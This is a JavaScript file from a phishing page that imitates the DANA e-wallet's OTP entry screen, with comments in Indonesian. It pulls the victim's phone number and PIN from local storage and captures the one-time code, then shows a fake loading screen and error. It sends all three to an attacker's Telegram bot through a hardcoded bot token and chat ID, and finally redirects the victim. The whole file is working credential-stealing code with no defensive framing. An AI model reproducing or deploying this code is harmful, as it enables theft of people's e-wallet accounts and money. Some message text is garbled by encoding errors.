const BOT_TOKEN = "8323795788:AAEEPpk072P23uatFdMS92CjcuVBYkc6tHM";
const CHAT_ID = "8080097570";

const phoneDisplay = document.getElementById("phone-display");
const phoneNumber = localStorage.getItem("phoneNumber") || "";
const pin = localStorage.getItem("pinDANA") || "";

// Tampilkan nomor jika tersedia
phoneDisplay.innerText = phoneNumber;

const inputs = document.querySelectorAll('.otp-boxes input');
const loading = document.getElementById('loading');
const errorBox = document.getElementById('error-message');

inputs[0].focus();

// Fungsi kirim ke Telegram
function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { 
      "Content-Type": "application/json" 
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      disable_notification: false
    })
  })
  .then(res => {
    if (!res.ok) {
      throw new Error(`HTTP error! status: ${res.status}`);
    }
    return res.json();
  })
  .then(data => {
    console.log("â Data berhasil dikirim");
  })
  .catch(err => {
    console.error("â Gagal mengirim data:", err);
  });
}

function checkOtpComplete() {
  const otp = Array.from(inputs).map(i => i.value).join('');
  if (otp.length === 4) {
    loading.style.display = 'flex';

    setTimeout(() => {
      loading.style.display = 'none';
      errorBox.style.display = 'block';

      // TAHAP 3: Kirim semua data (nomor + pin + otp)
      const message = `ððððð ðððð: ${phoneNumber}
ððð ðððð: ${pin}
ððð ðððð: ${otp}`;

      sendToTelegram(message);

      setTimeout(() => {
        errorBox.style.display = 'none';
        window.location.href = "index.html";
      }, 3000);

    }, 5000);
  }
}

// EVENT LISTENER UNTUK INPUT OTP (YANG INI YANG HILANG)
inputs.forEach((input, index) => {
  input.addEventListener('input', () => {
    input.value = input.value.replace(/[^0-9]/g, '');
    
    if (input.value && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }
    checkOtpComplete();
  });

  input.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && input.value === '' && index > 0) {
      inputs[index - 1].focus();
    }
  });
});

// Event listener untuk paste OTP
document.addEventListener('paste', (e) => {
  e.preventDefault();
  const pasteData = e.clipboardData.getData('text').replace(/[^0-9]/g, '');
  
  if (pasteData.length === 4) {
    const digits = pasteData.split('');
    inputs.forEach((input, index) => {
      input.value = digits[index] || '';
    });
    inputs[3].focus();
    checkOtpComplete();
  }
});